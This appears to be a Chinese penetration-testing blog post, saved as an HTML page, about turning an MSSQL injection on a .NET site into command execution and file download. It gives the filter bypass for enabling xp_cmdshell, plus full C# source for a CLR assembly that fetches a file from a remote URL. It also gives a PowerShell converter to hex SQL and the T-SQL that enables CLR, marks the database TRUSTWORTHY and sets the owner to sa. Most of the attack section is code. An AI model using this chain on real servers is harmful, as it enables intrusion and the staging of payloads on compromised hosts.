@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="qiqing">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="qiqing">
+    
+    <meta name="keywords" content="网络安全">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>渗透技巧之特殊环境的mssql思路 · qiqing&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/timg.jpeg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >qiqing&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">渗透技巧之特殊环境的mssql思路</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>qiqing's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            渗透技巧之特殊环境的mssql思路
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/10</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="渗透技巧之特殊环境的mssql思路"><a href="#渗透技巧之特殊环境的mssql思路" class="headerlink" title="渗透技巧之特殊环境的mssql思路"></a>渗透技巧之特殊环境的mssql思路</h1><h5 id="图片来源真实环境，目前取得都是历史保留"><a href="#图片来源真实环境，目前取得都是历史保留" class="headerlink" title="图片来源真实环境，目前取得都是历史保留"></a>图片来源真实环境，目前取得都是历史保留</h5><p>某次实战项目中，在一个.NET的站点发现了一个dbo权限的注入，但是这次遇到的数据库和windows版本都很高，本次记录下渗透过程中遇到的问题和解决方法<img src="/.io//image-20200219094347949.png" alt="image-20200219094347949"></p>
+<p>有了注入点，接下来就是查询三连，查询用户权限，查询版本信息，查询当前数据库</p>
+<p><img src="/.io//image-20200219095042968.png" alt="image-20200219095042968"></p>
+<p>dbo权限，开启xp_cmdshell发现有过滤，过滤了空格和%0a，这里用存储过程来绕过这个过滤</p>
+<p><img src="/.io//image-20200219095932280.png" alt="image-20200219095932280"></p>
+<p><img src="/.io//image-20200219100409650.png" alt="image-20200219100409650"></p>
+<p>开启之后，检查一下，先创建一个表，将xp_cmdshell的执行结果插入表中，然后用报错注入查询数据</p>
+<p><img src="/.io//image-20200219103432987.png" alt="image-20200219103432987"></p>
+<p><img src="/.io//image-20200219103534721.png" alt="image-20200219103534721"></p>
+<p>目标能成功执行命令，执行ping命令，看是否能出网，这里需要注意下，执行命令的时候可以用提取环境变量的字符替换空格</p>
+<p><img src="/.io//image-20200219143206079.png" alt="image-20200219143206079"></p>
+<p><img src="/.io//image-20200219143315287.png" alt="image-20200219143315287"></p>
+<p>目标执行下载命令无结果，后续尝试了<strong>certutil</strong>，<strong>bitsadmin</strong>，都报错了，写入vbs后，vbs拒绝访问，命令行下载失败，转回mssql，使用mssql的功能帮助我们下载文件</p>
+<p><img src="/.io//image-20200219143628981.png" alt="image-20200219143628981"></p>
+<p><img src="/.io//image-20200219143640607.png" alt="image-20200219143640607"></p>
+<p>解决这个问题可以使用CLR执行</p>
+<p>Common Language Runtime(CLR)程序集定义为可以导入SQL Server的.NET DLL（或DLL组）。导入后，DLL方法可以链接到存储过程并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL Server本机功能的好方法，但自然也为攻击者创造了机会。</p>
+<p>首先，需要先生成下载文件的dll，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace Hi.Test</span><br><span class="line">&#123;</span><br><span class="line">    public class SQLClr</span><br><span class="line">    &#123;</span><br><span class="line">        public static string Run(string url, string path)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                HttpWebRequest request &#x3D; WebRequest.Create(url) as HttpWebRequest;</span><br><span class="line">                &#x2F;&#x2F;发送请求并获取相应回应数据</span><br><span class="line">                HttpWebResponse response &#x3D; request.GetResponse() as HttpWebResponse;</span><br><span class="line">                &#x2F;&#x2F;直到request.GetResponse()程序才开始向目标网页发送Post请求</span><br><span class="line">                Stream responseStream &#x3D; response.GetResponseStream();</span><br><span class="line">                &#x2F;&#x2F;创建本地文件写入流</span><br><span class="line">                Stream stream &#x3D; new FileStream(path, FileMode.Create);</span><br><span class="line">                byte[] bArr &#x3D; new byte[1024];</span><br><span class="line">                int size &#x3D; responseStream.Read(bArr, 0, (int)bArr.Length);</span><br><span class="line">                while (size &gt; 0)</span><br><span class="line">                &#123;</span><br><span class="line">                    stream.Write(bArr, 0, size);</span><br><span class="line">                    size &#x3D; responseStream.Read(bArr, 0, (int)bArr.Length);</span><br><span class="line">                &#125;</span><br><span class="line">                stream.Close();</span><br><span class="line">                responseStream.Close();</span><br><span class="line">                return &quot;OK&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                return ex.ToString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public static void RunProc(string proc, string arg)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlDataRecord record &#x3D; new SqlDataRecord(new SqlMetaData(&quot;ret&quot;, SqlDbType.NVarChar, 4000));</span><br><span class="line">            SqlContext.Pipe.SendResultsStart(record);</span><br><span class="line">            record.SetString(0, Run(proc, arg));</span><br><span class="line">            SqlContext.Pipe.SendResultsRow(record);</span><br><span class="line">            SqlContext.Pipe.SendResultsEnd();</span><br><span class="line">        &#125;</span><br><span class="line">        public static string ProcessArch()</span><br><span class="line">        &#123;</span><br><span class="line">            return Marshal.SizeOf(typeof(IntPtr)) &#x3D;&#x3D; 8 ? &quot;x64&quot; : &quot;x86&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后需要将生成的dll转成hex，使用powershell脚本进行转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$assemblyFile &#x3D; &quot;C:\Users\Administrator\Downloads\63nmap\63\ClassLibrary1.dll&quot;&#x2F;&#x2F;生成的dll</span><br><span class="line">$stringBuilder &#x3D; New-Object -Type System.Text.StringBuilder </span><br><span class="line">$stringBuilder.Append(&quot;CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM &#96;n0x&quot;) | Out-Null</span><br><span class="line">$fileStream &#x3D; [IO.File]::OpenRead($assemblyFile)</span><br><span class="line">while (($byte &#x3D; $fileStream.ReadByte()) -gt -1) &#123;</span><br><span class="line"> $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">$stringBuilder.AppendLine(&quot;&#96;nWITH PERMISSION_SET &#x3D; UNSAFE&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[clr_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME </span><br><span class="line">[my_assembly].[StoredProcedures].[clr_exec];&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;EXEC[dbo].[clr_exec] &#39;whoami&#39;&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\Administrator\Downloads\63nmap\63\exec.txt&#x2F;&#x2F;生成的16进制</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20200219143933477.png" alt="image-20200219143933477"></p>
+<p>开启CLR，这里使用存储过程执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">-- Enable clr on the server</span><br><span class="line">sp_configure &#39;clr enabled&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20200219144843568.png" alt="image-20200219144843568"></p>
+<p>需要设置数据库拥有者为sa，这个方法不能使用master数据库来执行查询语句，这里使用存储过程执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter database [数据库名] set TRUSTWORTHY on</span><br><span class="line">EXEC sp_changedbowner &#39;sa&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20200219144907747.png" alt="image-20200219144907747"></p>
+<p>创建一个名为sysinfo的存储过程，创建执行存储过程的函数，这里创建存储过程不能使用存储过程执行，而且不能一起执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create assembly sysinfo from 0x4D5A90000300000004000000FFFF0000B8000000000000004000000000000000000000000000000000000000000000000*****</span><br><span class="line">with permission_set&#x3D;unsafe;</span><br><span class="line">create procedure sysinfo_run_proc(@proc nvarchar(max),@arg nvarchar(max)) as external name sysinfo.[Hi.Test.SQLClr].RunProc;</span><br><span class="line">create function sysinfo_run(@proc nvarchar(max),@arg nvarchar(max)) returns nvarchar(max) as external name sysinfo.[Hi.Test.SQLClr].Run;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20200219145231308.png" alt="image-20200219145231308"></p>
+<p><img src="/.io//image-20200219145251817.png" alt="image-20200219145251817"></p>
+<p>使用创建好的函数执行下载程序</p>
+<p><img src="/.io//image-20200219145437748.png" alt="image-20200219145437748"></p>
+<p>使用xp_cmdshell查看是否下载成功</p>
+<p><img src="/.io//image-20200219145920748.png" alt="image-20200219145920748"></p>
+<p><img src="/.io//image-20200219145945274.png" alt="image-20200219145945274"></p>
+<p>CLR可以将免杀的程序进行不落地执行，但是，如果免杀不太懂，还是建议创建一个能稳定下载的函数，这样可以便于团队的合作，将上线的操作交给熟悉免杀的队员</p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/03/10/ysoserial%E4%B9%8B%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89payload/" title= "ysoserial之添加自定义payload">
+                    <div class="nextTitle">ysoserial之添加自定义payload</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title= "反序列化学习">
+                    <div class="prevTitle">反序列化学习</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:2945624210@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透技巧之特殊环境的mssql思路"><span class="toc-number">1.</span> <span class="toc-text">渗透技巧之特殊环境的mssql思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#图片来源真实环境，目前取得都是历史保留"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">图片来源真实环境，目前取得都是历史保留</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/16/%E5%AE%9D%E5%A1%94%E4%BD%8E%E7%89%88%E6%9C%AC%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" >宝塔低版本登录绕过漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2020/03/16/DolphinPHP%20%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" >DolphinPHP 全版本后台代码执行漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/ysoserial%E4%B9%8B%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89payload/" >ysoserial之添加自定义payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/" >渗透技巧之特殊环境的mssql思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" >反序列化学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%86%E6%9E%90ysoserial/" >反序列化学习之分析ysoserial</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
